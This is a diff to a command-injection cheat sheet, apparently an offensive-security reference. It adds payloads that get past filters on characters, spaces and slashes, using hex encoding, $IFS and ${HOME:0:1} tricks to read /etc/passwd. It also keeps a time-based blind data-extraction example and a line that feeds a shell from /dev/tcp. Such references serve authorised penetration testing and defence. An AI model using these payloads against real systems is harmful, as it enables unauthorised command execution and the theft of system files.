@@ -12,11 +12,12 @@
 * [Filter Bypasses](#filter-bypasses)
   * [Bypass without space](#bypass-without-space)
   * [Bypass with a line return](#bypass-with-a-line-return)
+  * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
   * [Bypass blacklisted words](#bypass-blacklisted-words)
-   * [Bypass with single quote](#bypass-with-a-single-quote)
-   * [Bypass with double quote](#bypass-with-a-double-quote)
+   * [Bypass with single quote](#bypass-with-single-quote)
+   * [Bypass with double quote](#bypass-with-double-quote)
    * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
-   * [Bypass with $@](#bypass-with-----)
+   * [Bypass with $@](#bypass-with-)
    * [Bypass with variable expansion](#bypass-with-variable-expansion)
    * [Bypass with wildcards](#bypass-with-wildcards)
 * [Challenge](#challenge)
@@ -50,7 +51,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
-original_cmd_by_server || ls    Only if the first cmd fail
+original_cmd_by_server || ls   # Only if the first cmd fail
 ```
 
 ### Inside a command
@@ -70,23 +71,23 @@ Works on Linux only.
 swissky@crashlab:~/Www$ cat</etc/passwd
 root:x:0:0:root:/root:/bin/bash
 
-swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
+swissky@crashlab:~$ {cat,/etc/passwd}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
-swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
+swissky@crashlab:~$ cat$IFS/etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
-swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+swissky@crashlab:~$ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
 RCE
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
-swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
+swissky@crashlab:~$ X=$'uname\x20-a'&&$X
 Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 
-swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
+swissky@crashlab:~$ sh</dev/tcp/127.0.0.1/4242
 ```
 
 Commands execution without spaces, $ or { } - Linux (Bash only)
@@ -106,6 +107,57 @@ ping%PROGRAMFILES:~10,-5%IP
 
 ```powershell
 something%0Acat%20/etc/passwd
+```
+
+### Bypass characters filter via hex encoding
+
+Linux
+
+```powershell
+swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+/etc/passwd
+
+swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
+/etc/passwd
+
+swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
+/etc/passwd
+
+swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+root:x:0:0:root:/root:/bin/bash
+```
+
+### Bypass characters filter
+
+Commands execution without backslash and slash - linux bash
+
+```powershell
+swissky@crashlab:~$ echo ${HOME:0:1}
+/
+
+swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ echo . | tr '!-0' '"-1'
+/
+
+swissky@crashlab:~$ tr '!-0' '"-1' <<< .
+/
+
+swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+root:x:0:0:root:/root:/bin/bash
 ```
 
 ### Bypass Blacklisted words
@@ -169,12 +221,12 @@ g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 Extracting data : char by char
 
 ```powershell
-swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 real    0m5.007s
 user    0m0.000s
 sys 0m0.000s
 
-swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
 real    0m0.002s
 user    0m0.000s
 sys 0m0.000s
